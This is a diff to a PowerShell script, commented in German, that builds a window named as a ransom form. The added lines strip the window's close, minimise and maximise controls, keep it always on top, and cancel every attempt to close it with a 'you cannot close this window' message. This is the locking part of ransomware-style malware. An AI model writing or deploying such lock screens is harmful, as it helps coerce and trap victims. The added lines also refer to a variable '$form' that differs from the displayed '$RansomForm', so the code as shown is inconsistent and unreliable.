@@ -45,12 +45,24 @@ $RansomForm.ClientSize = '700,400'
 # Erstelle ein Label und füge es dem Formular hinzu
 $LabelObject = [System.Windows.Forms.Label]
 $Label = New-Object $LabelObject
-$Label.Text = 'Some text...'
+$Label.Text = ''
 $Label.AutoSize = $true
 $Label.Location = '200,150'
+$form.FormBorderStyle = 'FixedDialog'   # Fensterrahmen festlegen
+$form.ControlBox = $false               # Entfernt die Schließen-Schaltfläche
+$form.MaximizeBox = $false              # Deaktiviert Maximieren
+$form.MinimizeBox = $false              # Deaktiviert Minimieren
+$form.TopMost = $true                   # Fenster immer im Vordergrund halten
 
 # Füge das Label dem Formular hinzu
 $RansomForm.Controls.Add($Label)
+
+# Event abfangen: Versuche, das Schließen zu verhindern
+$form.Add_FormClosing({
+    $_.Cancel = $true  # Blockiert das Schließen des Fensters
+    [System.Windows.Forms.MessageBox]::Show("Du kannst dieses Fenster nicht schließen!", "Achtung")
+})
+
 
 # Zeige das Formular an
 $RansomForm.ShowDialog()
